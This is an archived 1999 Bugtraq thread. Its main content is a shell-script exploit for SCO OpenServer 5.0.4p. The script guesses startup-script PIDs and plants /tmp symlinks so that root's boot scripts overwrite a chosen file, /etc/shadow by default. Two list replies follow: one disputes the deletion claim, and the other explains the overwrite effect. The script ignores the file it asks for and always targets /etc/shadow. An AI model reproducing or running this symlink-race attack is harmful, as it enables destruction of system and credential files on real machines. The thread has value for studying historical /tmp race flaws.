#!/bin/sh
#
#                                   ... The punishment for inobedience ...
#                                                   (Cycle # 2)
#
#                This simple script can help to erase any file
#                 (SCO OpenServer Enterprise System v 5.0.4p).
#                                 Have fun !
#
#
#
#
# Some of "/etc/rc2.d" startup scripts create and then delete temporary files
# with  easily  predictable  names in "/tmp" directory.  Below there is a few
# interesting fragments of those nice scripts:
#
# S84rpcinit:
# ...
#       /bin/su root -c "/bin/ps -ef" > /tmp/rpc$$ 2>/tmp/rpc.err$$
#       /bin/rm -f /tmp/rpc.err$$
# ...
#       rm -rf /tmp/rpc$$
#
# S95nis:
# ...
#       /bin/su root -c "/bin/ps -ef" > /tmp/nis$$ 2>/tmp/nis.err$$
#       /bin/rm -f /tmp/nis.err$$
# ...
#       rm -f /tmp/nis$$
#
# S85tcp:
# ...
#       /bin/su root -c "/bin/ps -ef" > /tmp/tps$$ 2>/tmp/ps.err$$
#       /bin/rm -f /tmp/ps.err$$
# ...
#       /bin/rm -f /tmp/tps$$
#
# S89nfs:
# ...
#       /bin/su root -c "/bin/ps -ef" > /tmp/nfs$$ 2>/tmp/nfs.err$$
#       /bin/rm -f /tmp/nfs.err$$
# ...
#       rm -f /tmp/nfs$$
#
# Every time during the startup  such shell scripts creates files with names
# that include a process number of the above shell script. My numerous tests
# showed that the number is always the same with every reboot.  Pretty good,
# isn't it? One problem: how to determine the process number of such script?
# It's  so simple!  Child processes  of this script  have PID's  with values
# slightly over than  the parent's PID.  A little math and one gets it. Next
# step is  creating  a few symbolic links  to the victime file in the "/tmp"
# directory. During the next startup the victim file will be destroyed.
#
# P.S.  Looking forward  to getting published a complete SCO's list of names
# of such perfect shell scripts.
#
#                                   999,99*2
#
#                            ----------------------
#                ---------------------------------------------
#     -----------------   Dedicated to my beautiful lady   ------------------
#                ---------------------------------------------
#                            ----------------------
#
#       Leshka Zakharoff, 1999. E-mail: leshka@leshka.chuvashia.su (.ru)
#
#
#
if [ _$1 = "_" ]
then
    {
     echo -n "File to delete [/etc/shadow]:"
     read victim_file
     if [ _$victim_file = "_" ]
        then
            victim_file="/etc/shadow"
        fi
    }
else
    victim_file=$1
fi
pid=`/bin/ps -ef|/bin/grep -v awk|/usr/bin/awk '/inetd/ { printf  $2 }'`
lastpid=`expr $pid - 30`
while [ $pid != $lastpid ]
      do
        pid=`expr $pid - 1`;ln -fs /etc/shadow /tmp/tps$pid
      done
echo Done ! File \"$victim_file\" will be destroyed after the next reboot.


-----------------------------------------------------------------------------

Date: Mon, 8 Mar 1999 08:43:15 +0100
From: Peter van Dijk <peter@ATTIC.VUURWERK.NL>
To: BUGTRAQ@netspace.org
Subject: Re: Little exploit for startup scripts (SCO 5.0.4p).

On Sun, Mar 07, 1999 at 03:07:23PM +0300, leshka wrote:
> #!/bin/sh
> #
> #                                   ... The punishment for inobedience ...
> #                                                   (Cycle # 2)
> #
> #                This simple script can help to erase any file
> #                 (SCO OpenServer Enterprise System v 5.0.4p).

Umm.. I don't think so...

> if [ _$1 = "_" ]
> then
>     {
>      echo -n "File to delete [/etc/shadow]:"
>      read victim_file
>      if [ _$victim_file = "_" ]
>         then
>             victim_file="/etc/shadow"
>         fi
>     }
> else
>     victim_file=$1
> fi

nice.

> pid=`/bin/ps -ef|/bin/grep -v awk|/usr/bin/awk '/inetd/ { printf  $2 }'`

nice.

> lastpid=`expr $pid - 30`

good thinking!

> while [ $pid != $lastpid ]
>       do
>         pid=`expr $pid - 1`;ln -fs /etc/shadow /tmp/tps$pid

nice.

>       done
> echo Done ! File \"$victim_file\" will be destroyed after the next reboot.

No. rm -f removes just the symlink, not the target file.

Try this (tested on Linux, but SCO doesn't seem too broken to me):
# touch /etc/blah
$ ln -sf /etc/blah /tmp/blih
# rm -f /tmp/blih
# ls -al /etc/blah
-rw-r--r--   1 root     root            0 Mar  8 08:40 /etc/blah

Doesn't look very deleted to me...

Greetz, Peter.
--
.| Peter van Dijk           | <mo|VERWEG> stoned worden of coden
.| peter@attic.vuurwerk.nl  | <mo|VERWEG> dat is de levensvraag
                            | <mo|VERWEG> coden of stoned worden
                            | <mo|VERWEG> stonend worden En coden
                            | <mo|VERWEG> hmm
                            | <mo|VERWEG> dan maar stoned worden en slashdot lezen:)

-----------------------------------------------------------------------------

Date: Mon, 8 Mar 1999 18:37:45 +0200
From: "[iso-8859-1] Taneli Leppä" <rosmo@sektori.com>
To: BUGTRAQ@netspace.org
Subject: Re: Little exploit for startup scripts (SCO 5.0.4p).


On Mon, 8 Mar 1999 08:43:15 +0100, Peter van Dijk wrote:

>No. rm -f removes just the symlink, not the target file.

Actually the script won't delete any script, instead
it will overwrite any file:

# S84rpcinit:
# ...
#       /bin/su root -c "/bin/ps -ef" > /tmp/rpc$$ 2>/tmp/rpc.err$$
#       /bin/rm -f /tmp/rpc.err$$

Now if /tmp/rpc$$ was symlinked to another file, it would
be overwritten with output from /bin/ps... right? :-)

Regards,
Taneli
--
| Taneli Leppä <rosmo@sektori.com>, <http://www.rosmo.sektori.com>
| GSM: +358505485242 - Tärkeimmät uutiset: http://uutiset.icon.fi

